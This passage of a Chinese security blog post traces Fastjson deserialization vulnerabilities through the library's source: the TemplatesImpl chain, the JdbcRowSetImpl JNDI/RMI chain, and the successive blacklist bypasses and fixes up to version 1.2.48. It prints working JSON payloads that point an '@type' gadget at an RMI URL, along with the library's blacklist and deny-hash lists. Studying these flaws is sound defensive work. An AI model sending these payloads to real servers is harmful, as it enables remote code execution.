+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031938609.png" alt="image-20220403193810474"></p>
+<p>在第636行，<code>getDeserializer()</code>会根据我们传入的type类型获取对应的反序列化器，跟进该函数</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031942286.png" alt="image-20220403194230200"></p>
+<p>位置: <code>ParserConfig.getDeserializer</code> 305行左右</p>
+<p>跟进<code>getDeserializer</code> 方法后，发现会根据我们传入的type在derializers中寻找对应的反序列化器。</p>
+<p>derializers中存放着常见类和其对应的反序列化器(key-value形式)，这里由于我们的type是Object.class所以是能够找到对应的反序列化器的，所以进入第一个if，直接返回找到的反序列化器</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031950196.png" alt="image-20220403195024076"></p>
+<p><code>DefaultJSONParser.parse()</code> 1305行左右</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031951122.png" alt="image-20220403195157010"></p>
+<p>进入到switch，根据之前的token值进入对应的case，来到下面这个case处，这里new了一个JSON对象，然后利用<code>DefaultJSONParser.parseObject()</code> 对这个对象进行解析，此时fieleName为null，因为还没解析json字段中的内容</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031953668.png" alt="image-20220403195347568"></p>
+<p>位置：<code>DefaultJSONParser.parseObject()</code>  205行左右</p>
+<p>首先会对json进行一些规范的检测，然后就会判断<code>&#123;</code> 下一个字符是不是 <code>&quot;</code> ，由于json数据 <code>&#123;</code> 后面就是<code>&quot;</code> 所以我们继续往下看即可</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031954483.png" alt="image-20220403195449373"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031959386.png" alt="image-20220403195943325"></p>
+<p>继续往下看会有一个if判断，如果我们的key等于<code>JSON.DEFAULT_TYPE_KEY</code> 同时 没有开启<code>Feature.DisableSpecialKeyDetect</code> 就会进入判断，利用loadClass，加载我们的类对象</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032000656.png" alt="image-20220403200033550"></p>
+<p>然后会根据我们之前加载的类，寻找对应的反序列化器</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032005472.png" alt="image-20220403200506356"></p>
+<p>位置：<code>ParserConfig.getDeserializer()</code> 305行左右</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032007092.png" alt="image-20220403200718978"></p>
+<p>跟进<code>getDeserializer</code> 函数，由于此时我们的type是<code>class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 所以自然是找不到的，所以进入第二个if判断</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032007330.png" alt="image-20220403200740633"></p>
+<p>位置：<code>ParserConfig.getDeserializer()</code> 327行左右</p>
+<p>继续跟进<code>getDeserializer</code>方法，在第360行处会经过一个黑名单处理，会获取我们的类名然后判断我们的类是否在黑名单中</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032008098.png" alt="image-20220403200825993"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032008303.png" alt="image-20220403200859252"></p>
+<p>经过之后会进行一系列的判断，由于TemplatesImpl类都不在if判断的条件范围内，所以会创建一个<code>JavaBeanDeserializer</code> ，我们跟进<code>createJavaBeanDeserializer</code> 这个函数</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032009477.png" alt="image-20220403200940411"></p>
+<p>位置：<code>ParseConfig.createJavaBeanDeserializer()</code> 469行左右</p>
+<p>跟进<code>createJavaBeanDeserializer</code>函数，在第526行左右，发现调用了build函数，前面有讲过<code>build</code>，在build中会利用反射获取类的信息然后存在<code>beanInfo</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032010692.png" alt="image-20220403201011648"></p>
+<p>进入到585行的if判断，进入到<code>JavaBeanDeserializer</code>，我们继续跟进<code>JavaBeanDeserializer</code> 方法</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032010983.png" alt="image-20220403201053925"></p>
+<p><code>JavaBeanDeserializer</code> 构造函数 38行左右</p>
+<p>将<code>config</code>，<code>JavaBeanInfo</code>传入到<code>JavaBeanDeserializer</code>函数中</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032020409.png" alt="image-20220403202012280"></p>
+<p>遍历<code>beaninfo</code>中的<code>sortedFields</code>，然后根据对应的属性创建对应的反序列化器，然后添加到<code>sortedFieldDeserializerss</code>中</p>
+<p>在第二个for循环中会根据<code>fieldInfo</code>的名字调用<code>getFieldDeserializer</code>函数在<code>sortedFieldDeserializers</code>数组中寻找对应的反序列化器</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032021478.png" alt="image-20220403202123362"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032024346.png" alt="image-20220403202446254"></p>
+<p><code>getFieldDeserializer</code>就是一个查找的函数，找到了返回对应的反序列化器，没找到则返回null</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032025905.png" alt="image-20220403202540773"></p>
+<p><code>ParserConfig.getDeserializer</code> 大约466行</p>
+<p>重新回到<code>getDeserializer</code>函数，返回反序列化器</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032029127.png" alt="image-20220403202921035"></p>
+<p>位置：<code>DefaultJSONParser.parseObject()</code>  大约368行</p>
+<p>在都获取到了对应的反序列化器之后，正式开始进行反序列化</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032030573.png" alt="image-20220403203008449"></p>
+<p><code>JavaBeanDeserializer.deserialze()</code> 大约266行</p>
+<p>在570行左右，对我们的类进行了实例化</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032032960.png" alt="image-20220403203255855"></p>
+<p><code>JavaBeanDeserializer.parseField()</code> 720行左右</p>
+<p>在该方法中利用smartMatch对我们传入的属性进行了模糊匹配，跟进该函数</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032034149.png" alt="image-20220403203418039"></p>
+<p>首先会利用<code>getFieldDeserializer</code>寻找与key对应的反序列化器，如果找不到对应的则会判断是否属性是布尔类型（例：isName)</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032035178.png" alt="image-20220403203547679"></p>
+<p>前半部分不是重点</p>
+<p>重点来看后半部分，红框处将_替换为了空，即我们传入的<code>_outputProperties</code>  会在这里变成 <code>outputProperties</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032056788.png" alt="image-20220403205650650"></p>
+<p>然后调用<code>getFieldDeserializer</code>，在<code>sortedFieldDeserializers</code> 中找到<code>getOutputProperties</code> 方法，并且进行返回</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032039916.png" alt="image-20220403203941821"></p>
+<p><code>DefaultFieldDeserialier.parseField</code></p>
+<p>调用与属性对应的反序列化器，对属性进行反序列化，将反序列化后的值赋值给value，然后进入setValue</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032041633.png"></p>
+<p>此时method已为 <code>getOutputProperties</code></p>
+<p>具体后面就是，后面和CC链差不多就不进去了，参照大佬写的0.0</p>
+<p>此时method已为 <code>getOutputProperties</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032106945.png" alt="img"></p>
+<p>利用反射进行触发</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032106293.png" alt="img"></p>
+<p>位置：<code>TemplatesImpl.getOutputProperties()</code> 505行左右</p>
+<p>位置：<code>TemplatesImpl.getOutputProperties()</code> 505行左右</p>
+<p>然后就会调用getOutputProperties函数，然后getOutputProperties函数中会调用newTransformer()函数，跟进newTransformer函数</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105074.png" alt="img"></p>
+<p>位置：<code>TemplatesImpl.newTransformer()</code> 481行左右</p>
+<p>跟进getTransletInstance() 方法</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105299.png" alt="img"></p>
+<p>位置：<code>TemplatesImpl.getTransletInstance()</code></p>
+<p>如果<code>_class</code> 等于null，进入defineTransletClasses函数，进行跟进</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105481.png" alt="img"></p>
+<p>位置：<code>TemplatesImpl.defineTransletClasses()</code>  390行</p>
+<p>在414行左右，会调用defineClass来加载字节码</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105295.png" alt="img"></p>
+<p>位置：<code>TemplatesImpl.getTransletInstance()</code> 446行</p>
+<p>在第455行处，对加载的类进行了实例化，然后触发了静态方法，从而触发了恶意命令执行</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105461.png" alt="img"></p>
+<p>这个时候就走到了调用了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032103572.png" alt="image-20220403210318469"></p>
+<p>最后走到了执行命令</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105292.png" alt="image-20220403210504134"></p>
+<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>JdbcRowSetImpl利用链有两种利用方式，都基于Bean Property类型的JNDI利用</p>
+<blockquote>
+<p>RMI可以作为反序列化漏洞的入口（CVE-2017-3241），也可以利用RMI构造EXP实现远程代码执行</p>
+</blockquote>
+<ul>
+<li>JNDI + RMI</li>
+<li>JNDI + LDAP</li>
+</ul>
+<h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><p>反序列化 + JNDI注入 引起命令执行</p>
+<h4 id="限制条件-1"><a href="#限制条件-1" class="headerlink" title="限制条件"></a>限制条件</h4><p>Fastjson 1.2.22 —— 1.2.24，在1.2.25主要结合各种黑名单绕过使用。</p>
+<p>JNDI类型PoC主要分类：</p>
+<ul>
+<li>基于JNDI Bean Property类型（本篇主要分析）</li>
+<li>基于JNDI Field类型</li>
+</ul>
+<p>两种类型区别主要在于，Bean Property需要借助setter，getter方法触发；而Field类型没有这个限制</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">String</span> <span class="title class_">Po</span>C <span class="operator">=</span> <span class="string">&quot;&#123;<span class="char escape_">\&quot;</span>@type<span class="char escape_">\&quot;</span>:<span class="char escape_">\&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="char escape_">\&quot;</span>, <span class="char escape_">\&quot;</span>dataSourceName<span class="char escape_">\&quot;</span>:<span class="char escape_">\&quot;</span>rmi://localhost:1099/Exploit<span class="char escape_">\&quot;</span>, <span class="char escape_">\&quot;</span>autoCommit<span class="char escape_">\&quot;</span>:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>@type：</strong>目标反序列化类名；</li>
+<li><strong>dataSourceName：</strong>RMI注册中心绑定恶意服务；</li>
+<li><strong>autoCommit：</strong>调用setAutoCommit方法，利用lookup方法加载远程对象。</li>
+</ul>
+<h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>和上面的一样，就不分析了，直接放大佬分析的了</p>
+<p>触发点还是这里，利用反射触发setAutoCommit方法</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225678.png" alt="img"></p>
+<p>进入 setAutoCommit 方法</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225625.png" alt="img"></p>
+<p>然后进入了<code>connect</code>函数方法，然后在<code>connect</code>函数中，发现利用了<code>jndi</code>，那么我们如果控制了 <code>dataSourceName</code>就可以利用 JNDI 注入让客户端进行命令执行了，而这里<code>dataSourceName</code>恰恰可以控制，所以此处远程加载了我们HTTP服务上的恶意class</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225143.png" alt="img"></p>
+<p>从而弹了计算器</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225302.png" alt="img"></p>
+<h3 id="Fastjson的抗争史"><a href="#Fastjson的抗争史" class="headerlink" title="Fastjson的抗争史"></a>Fastjson的抗争史</h3><h4 id="1-2-25版本修复"><a href="#1-2-25版本修复" class="headerlink" title="1.2.25版本修复"></a>1.2.25版本修复</h4><p>官方修复文档 ：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/enable_autotype">https://github.com/alibaba/fastjson/wiki/enable_autotype</a></p>
+<p>这里主要是从两个角度进行了修复</p>
+<ol>
+<li><p>自从1.2.25 起 autotype 默认关闭</p>
+</li>
+<li><p>增加 checkAutoType 方法，在该方法中扩充黑名单，同时增加白名单机制</p>
+</li>
+</ol>
+<p>这里利用 IDEA 自带的代码比较来进行比对</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225152.png" alt="img"></p>
+<p>跟进 checkAutoType 函数，在第一个红框处首先会进行一个白名单，如果类在白名单中则会直接进行加载，在经过白名单之后又会经过一个黑名单处理，如果我们的类在黑名单中，会直接抛出报错</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225146.png" alt="img"></p>
+<p>同时在1.2.25中扩充了黑名单类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="1-2-25-1-2-41-绕过"><a href="#1-2-25-1-2-41-绕过" class="headerlink" title="1.2.25-1.2.41 绕过"></a>1.2.25-1.2.41 绕过</h4><p>由于在1.2.24修复中默认关闭了AutoType，所以这里我们要在代码中开启，不然会直接抛出错误</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJPoC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/refObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(PoC);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现在loadclass中，有两个判断，如果开头有 [ 或者 开头是L 结尾是 ;  那么就会去除，这里我们就可以尝试绕过</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225199.png" alt="img"></p>
+<p>但是这里其实只有 <code>[xxxxx;</code> 才能进行绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\<span class="string">&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/refObj\&quot;, \&quot;autoCommit\&quot;:true&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过源码断点分析，发现 <code>L</code> 开头并不会进行到 <code>TypeUtils.loadClass()</code> 这一步就会报错了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: exepct <span class="string">&#x27;[&#x27;</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>, <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="1-2-42-绕过"><a href="#1-2-42-绕过" class="headerlink" title="1.2.42 绕过"></a>1.2.42 绕过</h4><p>在该版本中直接换成了哈希校验，不让我们知道黑名单中的类，同时我们来看红框处的代码</p>
+<p>在该if中，对类的第一位和最后一位进行了哈希计算，如果第一位是 <code>L</code> 最后一位是 <code>;</code> 的话就进行去除，但是可以看到这里其实只去除了一次，我们只需要利用常见的复写即可绕过</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225555.png" alt="img"></p>
+<p>denyHashCodes 内容如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">8720046426850100497L</span>, -<span class="number">8109300701639721088L</span>, -<span class="number">7966123100503199569L</span>, -<span class="number">7766605818834748097L</span>, -<span class="number">6835437086156813536L</span>, -<span class="number">4837536971810737970L</span>, -<span class="number">4082057040235125754L</span>, -<span class="number">2364987994247679115L</span>, -<span class="number">1872417015366588117L</span>, -<span class="number">254670111376247151L</span>, -<span class="number">190281065685395680L</span>, <span class="number">33238344207745342L</span>, <span class="number">313864100207897507L</span>, <span class="number">1203232727967308606L</span>, <span class="number">1502845958873959152L</span>, <span class="number">3547627781654598988L</span>, <span class="number">3730752432285826863L</span>, <span class="number">3794316665763266033L</span>, <span class="number">4147696707147271408L</span>, <span class="number">5347909877633654828L</span>, <span class="number">5450448828334921485L</span>, <span class="number">5751393439502795295L</span>, <span class="number">5944107969236155580L</span>, <span class="number">6742705432718011780L</span>, <span class="number">7179336928365889465L</span>, <span class="number">7442624256860549330L</span>, <span class="number">8838294710098435315L</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是由于加密方法在源码中仍存在，所以我们可以通过哈希碰撞来得出黑名单中的类</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.alibaba</span><span class="selector-class">.fastjson</span><span class="selector-class">.util</span>.TypeUtils#fnv1a_64</span><br></pre></td></tr></table></figure>
+
+
+
+<p>目前github上已有项目 <a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225920.png" alt="img"></p>
+<p>poc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>, <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="1-2-43-修复"><a href="#1-2-43-修复" class="headerlink" title="1.2.43 修复"></a>1.2.43 修复</h4><p>在 1.2.43 中添加了对于<code>LL</code> 这种绕过方式的判断 ，由于之前的 <code>[</code>  那种类型在之前就会报错，所以这里用 <code>[</code> 是不行的</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225027.png" alt="img"></p>
+<h4 id="1-2-45-修复"><a href="#1-2-45-修复" class="headerlink" title="1.2.45 修复"></a>1.2.45 修复</h4><p>黑名单绕过</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;<span class="keyword">@type</span><span class="string">&quot;:&quot;</span>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory<span class="string">&quot;,&quot;</span>properties<span class="string">&quot;:&#123;&quot;</span>data_source<span class="string">&quot;:&quot;</span><span class="attribute">rmi</span>://<span class="attribute">localhost</span>:<span class="number">1099</span>/Exploit<span class="string">&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>修复措施：</p>
+<p>扩充黑名单</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225007.png" alt="img"></p>
+<h4 id="1-2-25-1-2-47-绕过-（通杀"><a href="#1-2-25-1-2-47-绕过-（通杀" class="headerlink" title="1.2.25 - 1.2.47 绕过 （通杀"></a>1.2.25 - 1.2.47 绕过 （通杀</h4><p>这一块单独拿出来说一下，因为这里的利用思路和前面的不一样</p>
+<p>在该payload中，可直接绕过checkAutoType，所以开或不开都可以成功触发</p>
+<p>Poc:</p>
+<p>RMI 还是上文的那个，所以这里就不重复放了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">       <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">       <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">       <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">       <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:1099/refObj&quot;</span>,</span><br><span class="line">       <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>效果图：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225548.png" alt="img"></p>
+<h4 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h4><p>在本方法中，主要是利用绕过checkAutoType中的黑名单机制来实现，可以看到这里if判断是 &amp;&amp;，这里的绕过方法就是让后面的那个判断为false，这样就可以绕过黑名单机制了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225383.png" alt="img"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.alibaba</span><span class="selector-class">.fastjson</span><span class="selector-class">.parser</span><span class="selector-class">.DefaultJSONParser</span>.class#parseObject</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先传入的是java.lang.Class，跟进checkAutoType函数</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225115.png" alt="img"></p>
+<p>由于黑名单中并不存在java.lang.Class，所以顺利进行到下面的判断，在<code>deserializers</code>中寻找对应<code>typeName</code>的反序列化器，由于java.lang.Class 是默认的类所以汇找到对应的反序列化器</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225991.png" alt="img"></p>
+<p>回到<code>com.alibaba.fastjson.parser.DefaultJSONParser.class#parseObject</code> 364行</p>
+<p>继续往下看，发现利用反序列化器进行反序列化</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225034.png" alt="img"></p>
+<p>跟进该方法 <code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> 177行</p>
+<p>继续往下看来到该方法的 231 行，会调用 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parser</code> 方法来取出我们传入的恶意类</p>
+<p>跟进看看</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225502.png" alt="img"></p>
+<p>跟进<code>com.alibaba.fastjson.parser.DefaultJSONParser#parser</code>，发现会获取我们传入的恶意类 ，并且进行返回</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225299.png" alt="img"></p>
+<p>然后将返回的数值赋值给 objVal</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225121.png" alt="img"></p>
+<p>在经过一系列的判断之后会赋值给 strVal</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226536.png" alt="img"></p>
+<p>继续往下看，会有有一个关键判断，如果解析出来的clazz为<code>java.lang.Class</code>，这里就会调用 <code>com.alibaba.fastjson.util.TypeUtils#loadClass</code> 来加载我们的恶意类</p>
+<p>这也就是为什么传入的类一定要是<code>java.lang.Class</code> 的原因所在</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225354.png" alt="img"></p>
+<p>跟进<code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>，注意这里默认cache为true，将恶意类缓存到mappings中</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225847.png" alt="img"></p>
+<p>这里再来到 <code>com.alibaba.fastjson.parser.DefaultJSONParser#checkAutoType</code>，由于不为<code>TypeUtils.getClassFromMapping(typeName)</code> 不为null，故绕过了黑名单校验，然后在if中取出了我们的恶意类</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226948.png" alt="img"></p>
+<p>ps：这里为开启了AutoType 的情况，如果没有开启的话也可以触发，如果没有开启，则红框处的if就不会进入，自然也不会走黑名单，而是直接从mapping中获取</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226549.png" alt="img"></p>
+<p>然后直接进行了返回</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226337.png" alt="img"></p>
+<p>后面的就和之前的一样了，还是那条链 setvalue中触发，这里不多赘述了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226554.png" alt="img"></p>
+<h4 id="1-2-48-修复"><a href="#1-2-48-修复" class="headerlink" title="1.2.48 修复"></a>1.2.48 修复</h4><p>在1.2.48中把缓存默认设为false（屏幕太小只能截一部分裂开..</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226194.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226566.png" alt="img"></p>
+<p>这样就无法进入该判断了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226904.png" alt="img"></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/xehnw7#8ee945e5">https://www.yuque.com/tianxiadamutou/zcfd4v/xehnw7#8ee945e5</a></p>
+<p><a target="_blank" rel="noopener" href="https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE/">https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.javasec.org/java-vuls/FastJson.html">https://www.javasec.org/java-vuls/FastJson.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/04/OWASP-TOP10/" rel="prev" title="owasp top10">
+      <i class="fa fa-chevron-left"></i> owasp top10
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/10/redis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="next" title="redis漏洞复现">
+      redis漏洞复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
